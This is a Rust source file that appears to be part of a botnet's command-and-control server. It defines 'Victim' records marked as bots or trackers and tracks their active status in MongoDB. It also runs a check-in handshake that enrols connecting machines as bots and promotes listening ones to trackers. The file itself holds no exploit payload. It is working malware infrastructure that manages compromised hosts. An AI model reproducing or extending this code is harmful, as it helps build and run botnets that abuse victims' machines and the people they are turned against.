use std::{fmt::Display, net::SocketAddr};
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;

use mongodb::bson::doc;
use mongodb::sync::Collection;

use serde::{Deserialize, Serialize};

use crate::tracker::is_victim_listening;

#[derive(Debug, Clone, Copy, Deserialize, Serialize)]
pub enum VictimType {
    Bot,
    Tracker
}

impl Display for VictimType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let display = match self {
            Self::Bot => "Bot",
            Self::Tracker => "Tracker"
        };
        write!(f, "{}", display)
    }
}

#[derive(Debug, Deserialize, Serialize)]
pub struct Victim {
    pub ip: SocketAddr,
    pub victim_type: VictimType
}

impl Victim {
    pub fn update_status(&self, victims_collection: &Collection<VictimDb>, status: bool) -> Result<(), Box<dyn std::error::Error>> {
        let filter = doc! { "ip": self.ip.to_string() };
        let update = doc! { "$set": { "active": status }};
        victims_collection.update_one(filter, update, None)?;

        Ok(())
    }
}

#[derive(Debug, Deserialize, Serialize)]
pub struct VictimDb {
    pub ip: String,
    pub victim_type: VictimType,
    pub active: bool
}

pub fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
    let mut buf_reader = BufReader::new(&mut stream);
    let mut http_request: Vec<u8> = Vec::new();
    buf_reader
        .read_until(0, &mut http_request).unwrap();

    let http_request = std::str::from_utf8(&http_request).unwrap();
    debug!("Request bytes: {:?}", http_request.as_bytes());
    if http_request != "bot\0" {
        error!("Someone connected without sending 'bot'");
        return None;
    };
    if stream.write_all("active\0".as_bytes()).is_err() {
        return None;
    }
    debug!("ip: {}", current_ip);
    let mut victim = Victim { ip: *current_ip, victim_type: VictimType::Bot };

    let mut buf_reader = BufReader::new(stream);

    let mut buffer = Vec::new();
    buf_reader.read_until(0, &mut buffer).unwrap();
    let buffer = std::str::from_utf8(&buffer).unwrap();
    if buffer != "ready\0" {
        error!("The client's server responded '{}' instead of 'ready'", buffer);
        return None;
    }

    // The victim only listens if it wants to be a tracker
    if is_victim_listening(&victim) {
        info!("The victim: {} is listening and will become a tracker", victim.ip);
        victim.victim_type = VictimType::Tracker;
    }

    Some(victim)
}
